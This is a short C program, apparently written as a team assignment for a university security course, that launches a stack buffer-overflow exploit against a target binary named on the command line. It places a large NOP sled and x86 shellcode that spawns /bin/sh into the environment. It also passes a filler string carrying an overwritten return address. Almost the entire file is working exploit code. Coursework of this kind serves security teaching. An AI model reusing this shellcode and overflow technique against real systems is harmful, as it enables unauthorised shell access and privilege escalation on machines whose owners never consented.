#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

/*
	CSE 545 - Spring 2018
	Team 9: Black Shadow (blackshadow@asu.edu)
*/

char *scode = "$(python -c 'print \"\x90\"*100000 + \"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\"')";

int main(int argc, char* argv[]) {
  if (argc != 2) {
    fprintf(stderr, "Invalid argument: %s\n", argv[0]);
    exit (1);
  }
  
  char *garbage = "AAAABBBBCCCCAAAABBBBCCCC\xa1\xdd\xff\xff";
  char *arrr[] = {NULL};
  
  // argv[1] location to our code needing injection - full path
  char *envp[] = {argv[1], "nada", "", garbage, NULL};

  envp[2] = scode;
  execve(envp[0], arrr, envp);
  return 0;
}